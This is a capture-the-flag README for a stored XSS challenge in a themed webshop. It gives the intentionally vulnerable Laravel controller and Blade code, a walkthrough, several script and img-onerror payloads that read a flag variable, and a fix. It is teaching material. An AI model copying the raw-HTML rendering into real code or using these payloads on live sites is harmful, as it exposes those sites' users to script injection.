# README: The Stored XSS Bio Exploit (Friday the 13th CTF)

## 1. Challenge Overview

This is a Stored XSS (Cross-Site Scripting) vulnerability in a web application's user profile system. The goal is to teach players how to identify and exploit input fields that render user content without proper sanitization, allowing JavaScript execution that can access sensitive data.

* **Theme**: Friday the 13th / Camp Crystal Lake Webshop
* **Difficulty**: Medium
* **Final Flag**: `CTF{STORED_XSS_COOKIE_THEFT}`

## 2. Vulnerability Logic (Creation)

The user bio feature has two critical flaws that create the stored XSS vulnerability.

| Layer | Location | Vulnerability |
|-------|----------|---------------|
| **Layer 1 (Storage)** | `AuthController@updateProfile` | Bio is stored WITHOUT sanitization |
| **Layer 2 (Display)** | `user-account.blade.php` | Bio is rendered with `{!! !!}` (raw HTML) |

### Vulnerable Code Locations

**Input (No Sanitization)** - `app/Http/Controllers/AuthController.php`:
```php
'bio' => $request->input('bio'),  // Stored directly without escaping
```

**Output (Raw HTML)** - `resources/views/user-account.blade.php`:
```blade
{!! $user->bio !!}  <!-- Renders raw HTML, executes JavaScript -->
```

### Flag Location

The flag is stored in a JavaScript variable named `secretFlag` that is defined on the user account page at `/account`.

Variable properties:
* Name: `secretFlag`
* Value: `CTF{STORED_XSS_COOKIE_THEFT}`
* Scope: Global (accessible via any injected script)

## 3. The Challenge Pose

The challenge appears to the player as a standard user profile with a "Bio" field where users can write about themselves.

**Normal user flow:**
1. User logs in and goes to Account page (`/account`)
2. User clicks "Edit Profile" (`/account/edit`)
3. User fills in the Bio field and saves
4. Bio appears on their profile page

**Hidden mechanic:**
* The bio field accepts any input including HTML and JavaScript
* The profile page has a JavaScript variable containing the flag
* The bio is rendered without sanitization, executing any JavaScript
* Injected JavaScript can read and display the flag variable

## 4. Possible Solve Path (Walkthrough)

### Step 1: Identify the Bio Field

The player explores the site and discovers they can edit their profile bio.

* **Action**: Go to `/account/edit` and examine the Bio field
* **Observation**: The field accepts any text input up to 500 characters

### Step 2: Test for XSS

The player tests if the bio field is vulnerable to XSS.

* **Action**: Enter `<script>alert('XSS')</script>` as bio
* **Result**: On their profile page, the alert executes (XSS confirmed)

### Step 3: Find the Flag

The player looks for interesting data accessible via JavaScript.

* **Action**: Enter `<script>alert(secretFlag)</script>` as bio
* **Result**: Alert displays the flag `CTF{STORED_XSS_COOKIE_THEFT}`

## 5. Example Payloads

### Basic XSS Test
```html
<script>alert('XSS')</script>
```

### Extract Flag (Alert)
```html
<script>alert(secretFlag)</script>
```

### Extract Flag (Image onerror)
```html
<img src=x onerror="alert(secretFlag)">
```

### Extract Flag (Display on Page)
```html
<p id="f"></p><script>document.getElementById('f').innerText=secretFlag</script>
```

### Extract Flag (Styled)
```html
<b id="f" style="color:red;font-size:24px"></b><script>document.getElementById('f').innerText=secretFlag</script>
```

## 6. Tools for Solvers

Players can use:

* **Browser DevTools**: Test JavaScript in console, inspect page source
* **Manual Testing**: Simply input scripts in the bio field
* **Burp Suite**: Intercept and modify requests if needed

## 7. Remediation (For Learning)

The secure way to display user input in Blade templates:

**Vulnerable:**
```blade
{!! $user->bio !!}
```

**Secure:**
```blade
{{ $user->bio }}
```

The double curly braces `{{ }}` automatically escape HTML entities, preventing XSS.
